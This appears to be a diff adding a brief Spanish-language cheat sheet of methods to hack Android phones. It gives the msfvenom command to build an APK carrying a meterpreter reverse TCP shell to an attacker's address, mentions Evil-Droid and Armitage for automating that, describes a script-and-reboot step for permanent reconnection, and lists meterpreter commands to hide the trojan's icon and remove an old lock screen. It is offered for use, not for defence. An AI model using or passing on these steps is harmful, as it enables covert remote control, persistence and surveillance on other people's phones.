@@ -1,0 +1,61 @@
+BASIC COMPILATION OF METHODS TO HACK ANDROID
+_____________________________________________
+
+
+1) Classic: msfvenom
+
+   >> msfvenom -p android/meterpreter/reverse_tcp lhost=<IP> lport=4444 r > /ruta/del/archivo.apk
+
+   >> Configurar el handleer
+
+2) Evil-Droid: automate msfvenom
+
+   -> Descargar de github
+
+   >> ./evil-droid
+
+   -> Seguir las instrucciones: es igual que msfvenom  pero automatico, abre el handler y todo...
+
+   -> Tiene otras opciones que quizás merezca la pena investigar
+
+3) Armitage: Graphical-Metasploit
+
+   --> Es lo mismo, pero con armitage que nunca lo usamos ...
+
+4) Hack android for lifetime
+
+   --> Crear la apk infectada
+
+   --> Subir el archivo
+
+       	     - scriptforandroid.sh a la sd card
+
+   --> Ejecutar
+
+       >> shell
+       >> cd/
+       >> cd sdcard
+       >> sh scriptforandroid.sh
+       -> CTRL-C
+       >> shell
+       >> reboot
+       >> exit
+
+   --> Ahora ya podemos iniciar el handler y esperar a que el android se nos conecte de forma permanente.
+
+
+5) Hide Trojan
+
+   --> Esconder el icono de MainActivity
+
+   >> Desde meterpreter
+
+   >> hide_app_icon
+
+6) Android LockScreen Bypass
+
+   --> Válido para el 4.0 al 4.3 (muy viejo ya...)
+
+   --> Desde meterpreter
+
+   >> use post/android/manage/remove_lock
